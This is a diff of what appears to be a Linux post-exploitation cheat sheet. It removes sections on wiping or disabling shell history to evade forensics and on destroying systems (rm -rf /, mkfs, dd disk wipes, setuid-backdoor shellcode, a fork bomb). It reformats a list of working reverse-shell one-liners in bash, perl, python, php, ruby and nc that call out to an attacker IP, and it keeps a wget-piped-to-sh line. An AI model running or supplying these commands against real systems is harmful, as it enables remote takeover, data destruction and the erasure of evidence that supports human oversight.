@@ -254,62 +254,6 @@ things to pull when all you can do is blindly read like in LFI/dir traversal (Do
 
 Also, check http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf for some one-liners that find world writable directories/files and more.
 
-<a name="tracks"/></a>
-## Covering Your Tracks
-
-<a name="avoid_history"/></a>
-### Avoiding history filesmys
-
-* export HISTFILE=  
-or  
-* unset HISTFILE
-
-This next one might not be a good idea, because a lot of folks know to check for tampering with this file, and will be suspicious if they find out.
-
-However if you happen to be on an account that was originally inaccessible, if the .bash_history file is available (ls -a ~), viewcating its contents can provide you with a good deal of information about the system and its most recent updates/changes.  
-clear all history in ram
-
-*  history -c
-*  rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null (invasive)
-*  touch ~/.bash_history (invasive)
-*  <space> history -c (using a space before a command)
-*  zsh% unset HISTFILE HISTSIZE
-*  tcsh% set history=0
-*  bash$ set +o history
-*  ksh$ unset HISTFILE
-*  find / -type f -exec {} (forensics nightmare)
-
-Note that you’re probably better off modifying or temporary disabling rather than deleting history files, it leaves a lot less traces and is less suspect.
-
-In some cases HISTFILE and HISTFILESIZE are made read-only; get around this by explicitly clearing history (history -c) or by kill -9 $$’ing the shell. Sometimes the shell can be configured to run ‘history -w’ after every command; get around this by overriding ‘history’ with a no-op shell function. None of this will help if the shell is configured to log everything to syslog, however.
-
-<a name="destroy"/><a>
-### Deleting and Destroying
-
-**If it is necessary to leave the machine inaccessible or unusable. Note that this tends to be quite evident (as opposed to a simple exploitation that might go unnoticed for some time, even forever), and will most surely get you into troubles.**  
-**Oh, and you’re probably a jerk if you use any of the stuff below.**
-
-| File                                  | Description and/or Reason                                     |
-| ------------------------------------- | ------------------------------------------------------------- |
-| rm -rf /                              | This will recursively try to delete all files                 |
-| mkfs.ext3 /dev/sda                    | Reformat the device mentioned, making recovery of files hard  |
-| dd if=/dev/zero of=/dev/sda bs=1M     | Overwrite disk /dev/sda with zeros                            |
-
-* Hex version of rm -rf / *(How is this supposed to work?)*  
-> char esp[] \_\_attribute\_\_ ((section(”.text”))) /* e.s.p release */ = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68\"  
-> “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99\"  
-> “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7\"  
-> “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"  
-> “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"  
-> “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"  
-> “\x6e\x2f\x73\x68\x00\x2d\x63\x00"  
-> “cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;”;  
-
-* **Fork Bomb**: The [in]famous "fork bomb". This command will cause your system to run a large number of processes, until it "hangs". This can often lead to data loss (e.g. if the user brutally reboots, or the OOM killer kills a process with unsaved work). If left alone for enough time a system can eventually recover from a fork bomb.  
-
-> :(){:|:&};:
-
-
 
 
 <a name="escalating"/><a>
@@ -332,17 +276,17 @@ In some cases HISTFILE and HISTFILESIZE are made read-only; get around this by e
 <a name="rev_shell"/><a>
 ### Reverse Shell
 Starting list sourced from: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-* bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 (No /dev/tcp on older Debians, but use nc, socat, TCL, awk or any interpreter like Python, and so on.).
-* perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};'
-* python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
-* php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
-* ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' nc -e /bin/sh 10.0.0.1 1234 # note need -l on some versions, and many does NOT support -e anymore
-* rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+* `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` (No /dev/tcp on older Debians, but use nc, socat, TCL, awk or any interpreter like Python, and so on.).
+* ```perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};'```
+* ```python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'```
+* `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
+* ```ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' nc -e /bin/sh 10.0.0.1 1234``` # note need -l on some versions, and many does NOT support -e anymore
+* ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f```
 * xterm -display 10.0.0.1:1se	
 * Listener- Xnest :1
 * Add permission to connect- xhost +victimIP
 * ssh -NR 3333:localhost:22 user@yourhost
-* nc -e /bin/sh 10.0.0.1 1234
+* `nc -e /bin/sh 10.0.0.1 1234`
 
 <a name="remote_script"/><a>
 ### Execute a Remote Script
@@ -350,8 +294,4 @@ Starting list sourced from: http://pentestmonkey.net/cheat-sheet/shells/reverse-
 wget http://server/file.sh -O- | sh  
 This command forces the download of a file and immediately its execution
 
-<a name="windows"/><a>
-### Fun if Windows is present and accessible
-If there is Windows installed and the logged-in user access level includes those Windows partition, attacker can mount them up and do a much deeper information gathering, credential theft and root-ing. Ntfs-3g is useful for mounting ntfs partitions read-write.
 
-**TODO**: insert details on what to loo
